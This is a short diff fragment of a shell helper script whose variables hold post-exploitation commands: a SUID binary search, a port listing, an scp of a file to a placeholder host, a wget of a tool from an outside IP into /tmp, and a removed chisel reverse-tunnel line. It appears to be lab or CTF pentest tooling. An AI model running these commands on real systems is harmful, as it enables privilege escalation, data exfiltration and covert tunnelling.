@@ -4,7 +4,6 @@ COMMAND_1='find / -perm -u=s -type f 2>/dev/null'
 COMMAND_2='ss -tulpn'
 COMMAND_3='scp FILE_TO_SEND L_H_O_S_T'
 COMMAND_4='wget -O /tmp/ http://10.9.233.39:8000/[TOOL]'
-COMMAND_5='/tmp/chisel client L_H_O_S_T:9999 R:L_H_O_S_T:8888:127.0.0.1:[OPEN_PORT]'
 
 show_menus() {
   clear
